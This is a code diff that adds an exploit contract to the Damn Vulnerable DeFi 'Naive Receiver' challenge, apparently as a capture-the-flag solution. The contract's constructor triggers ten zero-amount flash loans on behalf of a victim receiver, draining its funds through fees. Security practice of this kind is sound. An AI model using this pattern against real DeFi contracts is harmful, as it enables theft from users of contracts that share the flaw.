@@ -7,6 +7,21 @@ import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 import "solady/src/utils/SafeTransferLib.sol";
 import "./FlashLoanReceiver.sol";
 
+contract TakeMoney {
+    IERC3156FlashLender pool;
+    IERC3156FlashBorrower receiver;
+
+    constructor(address _pool, address _receiver){
+        pool = IERC3156FlashLender(_pool);
+        receiver = IERC3156FlashBorrower(_receiver);
+        bytes memory byteData = "";
+        for(uint i = 0; i < 10; ++i) {
+            pool.flashLoan(receiver, 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, 0,byteData);
+        }
+    }
+}
+
+
 /**
  * @title NaiveReceiverLenderPool
  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
